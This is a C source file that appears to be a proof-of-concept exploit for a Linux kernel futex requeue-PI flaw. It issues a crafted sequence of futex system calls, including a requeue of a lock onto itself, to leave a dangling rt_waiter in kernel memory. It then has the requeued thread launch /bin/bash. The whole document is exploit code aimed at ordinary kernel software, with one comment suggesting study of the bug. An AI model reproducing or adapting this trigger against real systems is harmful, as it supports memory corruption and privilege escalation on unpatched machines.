#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>

#define FUTEX_LOCK_PI            6
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

int uaddr1 = 0;
int uaddr2 = 0;

void *action() {
    printf("[*] New thread waiting requeue...\n");
    syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);

    // rt_waiter for this thread (in its kernel thread stack) is not cleared.
    // what does the rt_waiter list look like?
    printf("[*] New thread get lock\n");
    printf("[*] Open a shell\n");
    system("/bin/bash");

    while (1) {
        sleep(10);
    }

}

void main() {
    int ret = 0;
    pthread_t th;

    syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

    usleep(100);

    pthread_create(&th, NULL, action, NULL);

    printf("[*] uaddr2: %d\n", uaddr2);

    while(1) {
        ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
        if (ret == 1) {
            printf("[*] Requeued new thread from uaddr1 to uaddr2\n");
            break;
        }
        usleep(10);
    }

    printf("[*] Set uaddr2 to 0.\n");
    uaddr2 = 0;

    syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);

    while (1) {
        sleep(10);
    }
}